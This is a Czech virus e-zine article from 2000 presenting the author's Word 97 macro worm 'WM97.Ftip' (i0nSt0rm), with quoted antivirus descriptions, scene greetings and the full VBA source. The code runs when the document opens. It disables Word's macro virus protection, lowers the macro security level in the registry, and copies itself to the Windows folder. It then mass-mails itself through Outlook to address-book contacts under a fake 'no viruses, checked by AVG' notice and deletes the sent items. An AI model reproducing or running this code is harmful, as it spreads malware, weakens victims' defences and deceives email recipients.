' /For [Mi0NS] e-zine #1 from [gl_st0rm]/
'
'
'                       [WM97.Ftip] 
'                      [by gl_st0rm]
'
'
'Start:
'======
'Zdravim! Na tomto miste bych Vam, vsem co ctete tyto radky, chtel predstavit
'muj prvni a tedy opravdu hodne "lame" I-Worm :) Jedna se o I-Worm napsany
've VBA (Visual Basic for Application), presneji o dokument ftip.DOC, ktery
'se siri pomoci emailu, pres nainstalovany Micro$oft Outlook(98/2K). 
'Tato cast wormu je "ukradena" z viru WM97/Melissa, za coz se dost stydim :(
'...priste to snad bude lepsi :)))
'
'
'Hlavni rysy:
'============
'Worm potrebuje, pro svou 100%centni funkcnost, operacni system W98/ME, nebo
'W95 s podporou "Microsoft Visual Basic Scripting 3.0+" (VBS). Pod Windows NT/2k
'sem to netestoval, ale pod Win2k je podpora VBS jiz jako default.
'Dale je potreba Microsoft Word 97+ a taky Microsoft Outlook 98+.
'
'
'Co gdyz to spustim? :
'=====================
'Worm is zjisti gde je umistena slozka Windows (exm "C:\Windows")
'Vypne ochranu spusteni maker (SecurityLevel=1)
'Overi si, jestli na tomto pocitaci uz nebyl odeslan.
'Pokud byl, tak ukonci svou aktivitu.
'Pokud NE , tak se pokusi zjistit jmeno uzivatele (RegisteredOwner)
'z registru, ulozi se jako dirwin & "\ftip.doc", gde dirwin je slozka 
'Microsoft Windows, vytvori objekt Outlook, zjisti si adresy z Adresare
'a pokusi se odeslat.
'Jako subjekt doplni "RE:", jako telo zpravy:
'	Chtel si ftipy, tak tady je mas!!! ;)))
'	[ _RegisteredOwner_ ]
'	---
'	Odchozí zpráva neobsahuje viry.
'	Zkontrolováno antivirovým systémem AVG (http://www.grisoft.cz).
'	Verze: 6.0.219 / Virová báze: 103 - datum vydání: 5.12.2000
'Prilohou je "ftip.doc" obsahujici worma.
'Pokud uspeje s odeslanim, ulozi si to do registru.
'Pri zavirani dokumentu se s 1/3 pravdepodobnosti zobrazi msgbox.
'
'
'AVG's description:
'==================
'W97M/Ftip je jednoduchouèký worm, který se rozesílá na 30 adres z každého 
'adresáøe (tato èást kódu je vykradena z viru W97M/Melissa). Zaslané maily 
'mají subject "RE:" a text: 
'
'Chtel si ftipy, tak tady je mas!!! ;)))
'[ _doplneno_skutecne_jmeno_uzivatele_ ]
'---
'Odchozí zpráva neobsahuje viry.
'Zkontrolováno antivirovým systémem AVG (http://www.grisoft.cz).
'Verze: 6.0.219 / Virová báze: 103 - datum vydání: 5.12.2000 
'Worm je pøipojen v souboru ftip.doc. 
'
'Úspešné odeslání mailu si poznaèí do registry:
'Klíè: "HKLM\Software\Microsoft\Windows\CurrentVersion\i0nSt0rm"
'Hodnota: "...by gl"
'
'Zdroják zaèíná komentáøi:
'' W97/2k.i0nSt0rm
'' Code by gl_st0rm 
'
'Po zavøení infikovaného dokumentu zobrazí s 1/3 pravdìpodobností message box s hlavièkou: 
'
'Err0r! :->
'a textem: 
'W97/2k.i0nSt0rm code by gl_st0rm 
'
'
'Experti.cz description:
'=======================
'>W97M/Ftip.A@mm Dokument s názvem Ftip.DOC (také zaznamenán i0nSt0rm.DOC) obsahuje kód 
'vycházející z viru Melissa. Vypíná antivirovou ochranu maker MS Word, zasahuje do registru
'Windows a systému elektronické pošty s cílem hromadného rozesílání zprávy obsahující 
'zavirovaný dokument jako pøílohu a doprovodný text v tìle mailu Chtel jsi ftipy, tak tady
'je mas!!! ;))) ... Odchozí zpráva neobsahuje viry. Zkontrolováno antivirovým systémem AVG,
'(http://www.grisoft.cz), Verze 6.0.219 / Virová báze: 103 - datum vydání: 5.12.2000.
'Dokument sám obsahuje text: HA! HA! HA! Bez maker to nepùje !!! psaný velkým písmem.
'
'
'Greetz:
'=======
'	Benny/29a ..... a stejne je to shit! :)
'       Necronomi ..... Thanx for your BIG help and VCK!
'       [pxR] ......... fuck tablet, try virii!
'       Ratter ........ je te na mIRCu videt cim dal tim min! :( 
'       LammerC ....... Ty to jednou tezce wobseres!, ale pro tentokrat uz ti to prominu :)
'       Napalm ........ Proc to taky neskusit? :)
'       Mikeman ....... grr!
'       Wion .......... Stop learning, start coding!
'       Radix16 ....... Who are u?
'       All 29Aers .... Thx for good chat on mIRC #virus cannel :))) 
'
'
'(c) 2000 gl_st0rm.
'
'Zdrojak zacina tady:
'====================

' WM97/2k.i0nSt0rm
' Code by gl_st0rm
    
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.ShowVisualBasicEditor = False
Options.ConfirmConversions = False
Options.VirusProtection = False
Set FSO = CreateObject("Scripting.FileSystemObject")
Set dirwin = FSO.GetSpecialFolder(0)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
 If regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\i0nSt0rm") <> "...by gl" Then
  user = regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
  ActiveDocument.SaveAs FileName:=dirwin & "\ftip.doc", FileFormat:=wdFormatDocument
  Set Outlook = CreateObject("Outlook.Application")
  Set MAPI = Outlook.GetNameSpace("MAPI")
      MAPI.Logon "profile", "password"
      For Y = 1 To MAPI.AddressLists.Count
          Set AddyBook = MAPI.AddressLists(Y)
          X = 1
          Set Out = Outlook.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Mail = AddyBook.AddressEntries(X)
              Out.Recipients.Add Mail
              X = X + 1
              If X > 30 Then oo = AddyBook.AddressEntries.Count
           Next oo
           Out.Subject = "RE:"
           Out.Body = "Chtel si ftipy, tak tady je mas!!! ;)))"
           Out.Body = Out.Body & vbCrLf & ""
           Out.Body = Out.Body & vbCrLf & "[" & user & "]"
           Out.Body = Out.Body & vbCrLf & "---"
           Out.Body = Out.Body & vbCrLf & "Odchozí zpráva neobsahuje viry."
           Out.Body = Out.Body & vbCrLf & "Zkontrolováno antivirovým systémem AVG (http://www.grisoft.cz)."
           Out.Body = Out.Body & vbCrLf & "Verze: 6.0.219 / Virová báze: 103 - datum vydání: 5.12.2000"
           Out.Body = Out.Body & vbCrLf & vbCrLf & vbCrLf & vbCrLf
           Out.Attachments.Add (dirwin & "\ftip.doc")
           Out.DeleteAfterSubmit = True
           Out.Send
           Mail = ""
      Next Y
      MAPI.Logoff
      regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\i0nSt0rm", "...by gl"
 End If
'Application.Quit
End Sub
Private Sub Document_Close()
Dim M
M = Int((3 * Rnd) + 1)
 If M = 2 Then
  msg = "W97/2k.i0nSt0rm" & vbCrLf & "code by gl_st0rm"
  MsgBox msg, vbCritical, "Err0r! :->"
 End If
End Sub